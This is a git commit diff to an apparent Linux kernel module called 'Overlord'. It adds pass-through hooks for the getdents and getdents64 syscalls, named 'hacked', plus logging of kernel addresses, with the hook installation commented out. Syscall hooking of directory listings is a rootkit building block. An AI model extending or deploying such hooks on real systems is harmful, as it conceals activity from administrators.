08f9f07b1015138cfd122eef95a98d36c1e7bd61
Jack Foltz <jack@foltz.io>
2019-04-10 01:16:21 -0400

    Add getdents hook test

--- main.c
+++ main.c
@@ -2,13 +2,35 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 
+#include <linux/linkage.h>
+#include <linux/unistd.h>
+
+#include <linux/dirent.h>
+#include <linux/syscalls.h>
+
 #include "syscall.h"
 
 MODULE_LICENSE("GPL"); // nt torvalds
 
+typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *, unsigned int);
+asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
+    printk(KERN_INFO "[Overlord] getdents hacked!");
+    return ((orig_getdents_t)orig_syscall(__NR_getdents))(fd, dirent, count);
+}
+
+typedef asmlinkage int (*orig_getdents64_t)(unsigned int, struct linux_dirent64 *, unsigned int);
+asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) {
+    printk(KERN_INFO "[Overlord] getdents64 hacked!");
+    return ((orig_getdents64_t)orig_syscall(__NR_getdents64))(fd, dirent, count);
+}
+
 static int __init overlord_init(void) {
     syscall_setup();
+    printk(KERN_INFO "[Overlord]: Ours: %px\n", &hacked_getdents64);
+    printk(KERN_INFO "[Overlord]: Orig: %px\n", (void*)orig_syscall(__NR_getdents64));
     printk(KERN_INFO "[Overlord]: Hello World!\n");
+    //hook_syscall(&hacked_getdents, __NR_getdents);
+    //hook_syscall(&hacked_getdents64, __NR_getdents64);
     return 0;
 }
 
